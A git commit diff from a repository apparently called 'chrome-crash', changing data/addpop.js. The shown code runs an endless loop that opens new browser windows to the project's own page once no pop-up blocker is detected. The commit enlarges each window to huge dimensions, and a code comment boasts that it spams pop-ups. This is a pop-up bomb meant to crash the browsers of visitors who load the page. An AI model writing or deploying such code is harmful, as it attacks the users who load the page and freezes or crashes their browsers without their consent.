8d498179c71674e6156c64b96d16cd1e45862764
Your Fun Guy <78428114+The-Imortal-Crasher@users.noreply.github.com>
2021-11-17 22:47:25 -0800

    Last Update To /data

--- data/addpop.js
+++ data/addpop.js
@@ -17,7 +17,7 @@ function detectPopupBlocker() {
   } else {
     myTest.close();
     while (true) {
-      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+      var strWindowFeatures = "location=yes,height=123400,width=45400,scrollbars=yes,status=yes";
       var URL = "https://the-imortal-crasher.github.io/chrome-crash/" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
       //If no pop-up blocker spams a shit ton of pop-ups
